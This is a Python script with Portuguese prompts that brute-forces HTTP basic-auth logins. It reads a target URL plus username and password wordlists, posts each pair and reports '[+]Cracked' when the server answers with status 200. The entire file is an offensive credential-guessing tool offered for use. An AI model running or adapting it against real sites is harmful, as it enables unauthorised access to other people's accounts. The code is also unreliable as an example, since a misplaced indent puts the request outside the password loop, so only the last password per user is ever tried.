#!/usr/bin/env python3
# Author: Leandro Batista
# E-mail: leandro.pereira@inova.net

import requests
from colorama import init
from colorama import Fore
init(autoreset=True)

url = input("Digite a url alvo: ")
user = input("Digite a wordlist de usuarios: ")
with open(user) as u:
    user_list = u.readlines()
    
wordlist = input("Digite o caminho para a wordlist: ")
with open(wordlist) as p:
    word = p.readlines()

for users in user_list:
    usuarios = users.rstrip()
    for passwd in word:
        senhas = passwd.rstrip()
    r = requests.post(url, auth=(usuarios, senhas))
    if r.status_code == 200:
        print(Fore.GREEN + "[+]Cracked %s %s " % (usuarios, senhas))
    else:
        print(Fore.RED + "[-]Fail %s %s " % (usuarios, senhas))
